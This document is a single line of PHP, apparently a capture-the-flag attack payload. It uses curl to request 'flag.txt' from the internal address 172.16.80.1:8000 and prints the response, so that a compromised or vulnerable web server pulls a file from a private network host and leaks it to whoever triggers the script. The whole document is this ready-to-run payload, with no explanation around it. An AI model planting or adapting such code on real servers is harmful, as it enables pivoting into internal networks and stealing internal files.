<?php $ch = curl_init();curl_setopt($ch,CURLOPT_URL,'http://172.16.80.1:8000/flag.txt');echo curl_exec($ch);?>
